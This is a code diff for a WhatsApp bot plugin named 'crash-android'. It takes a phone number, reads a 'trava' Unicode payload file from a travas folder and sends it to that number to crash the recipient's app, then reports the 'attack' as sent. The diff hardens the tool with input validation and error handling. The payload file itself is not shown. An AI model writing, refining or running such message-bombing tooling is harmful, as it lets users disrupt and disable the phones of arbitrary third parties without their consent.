@@ -1,47 +1,59 @@
+import { jidDecode } from '@whiskeysockets/baileys'
 import fs from 'fs'
 import path from 'path'
 
 const crashAndroidMisa = {
     name: 'crash-android',
     alias: ['ca', 'crash', 'ola'],
-    category: 'tools', // Usa 'tools' para que el bot lo registre bajo tu categoría principal
+    category: 'tools',
     noPrefix: true,
 
-    run: async (conn, m, { args, command, text }) => {
-        // 1. Verificación inmediata
+    run: async (conn, m, { args, command }) => {
+        // 1. Validación estricta del número
         if (!args[0]) {
-            return conn.sendMessage(m.chat, { 
-                text: `✧ ‧₊˚ *MISA CRASH* ୧ֹ˖ ⑅ ࣪⊹\n\n✰ \`Uso\`: ${command} [número]\n> ✐ *Ejemplo:* ${command} 1809xxxxxxx` 
-            }, { quoted: m })
+            return m.reply(`✧ ‧₊˚ *MISA CRASH* ୧ֹ˖\n\n> ✐ *Uso:* ${command} [número]`)
         }
 
         try {
-            // 2. Localizar el archivo en tu carpeta /travas/
-            const travaRuta = path.join(process.cwd(), 'travas', 'ola.js')
-
-            if (!fs.existsSync(travaRuta)) {
-                return m.reply('❌ *Error:* No encontré el archivo `ola.js` en la carpeta `travas`.')
+            // Limpiamos el número
+            let num = args[0].replace(/[^0-9]/g, '')
+            
+            // SI EL NÚMERO QUEDA VACÍO DESPUÉS DE LIMPIAR, PARAMOS AQUÍ
+            if (!num || num.length < 8) {
+                return m.reply('❌ *El número es inválido o muy corto.*')
             }
 
-            // 3. Leer el contenido (tu texto de unicodes)
-            const contenido = fs.readFileSync(travaRuta, 'utf-8')
+            let targetJid = num + '@s.whatsapp.net'
 
-            // 4. Limpiar el JID del objetivo
-            const target = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
+            // 2. Ruta al archivo de texto (ola.js)
+            const travaPath = path.join(process.cwd(), 'travas', 'ola.js')
 
-            // 5. Reacción y envío
+            if (!fs.existsSync(travaPath)) {
+                return m.reply('❌ No encontré el archivo `ola.js` en la carpeta `travas`.')
+            }
+
+            const contenido = fs.readFileSync(travaPath, 'utf-8')
+
+            // 3. Verificación de JID antes de enviar (Para evitar el error de jidDecode)
+            const decode = jidDecode(targetJid)
+            if (!decode || !decode.user) {
+                return m.reply('❌ *Error fatal:* El JID generado es inválido.')
+            }
+
+            // 4. Ejecución
             await conn.sendMessage(m.chat, { react: { text: '💀', key: m.key } })
             
-            await conn.sendMessage(target, { text: contenido })
+            // Envío al objetivo
+            await conn.sendMessage(targetJid, { text: contenido })
 
-            // 6. Confirmación de salida
-            await m.reply(`✅ *Enviado con éxito a @${args[0].replace(/[^0-9]/g, '')}*`)
+            await m.reply(`✅ *Ataque enviado a @${num}*`)
 
         } catch (err) {
-            console.error('Error en Crash Misa:', err)
+            // Este catch evita que el bot se apague si algo sale mal
+            console.error('Error controlado en Crash:', err)
+            m.reply('⚠️ Hubo un error en el envío, pero el bot sigue vivo.')
         }
     }
 }
 
-// ESTO ES VITAL: Tu bot usa export default para cargar el objeto completo
 export default crashAndroidMisa
